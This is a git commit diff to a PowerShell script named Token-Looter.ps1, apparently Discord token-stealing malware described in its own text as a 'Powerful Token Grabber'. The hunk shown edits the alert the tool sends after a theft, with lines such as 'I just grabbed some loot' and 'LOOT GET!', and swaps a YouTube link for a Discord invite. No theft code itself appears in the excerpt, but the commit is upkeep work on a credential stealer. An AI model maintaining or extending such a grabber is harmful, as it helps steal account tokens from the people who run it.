bffab0be99cb015e7edcf25d249ef20781257a81
Eve <35784752+benalec@users.noreply.github.com>
2024-01-12 16:58:08 -0500

    Update Token-Looter.ps1

--- Token-Looter.ps1
+++ Token-Looter.ps1
@@ -662,9 +662,9 @@ function Backup-Data {
         "username" = "POWER"
         "content" = "Haiii I just grabbed some loot :3"
         "title" = "KDOT"
-	"url" = "https://www.youtube.com/watch?v=t8KqCp76qqQ"
         "description" = "Powerful Token Grabber"
         "color" = "3447003"
+	"url" = "https://discord.gg/vk3rBhcj2y"
         "embeds" = @(
             @{
                 "title" = "LOOT GET!"
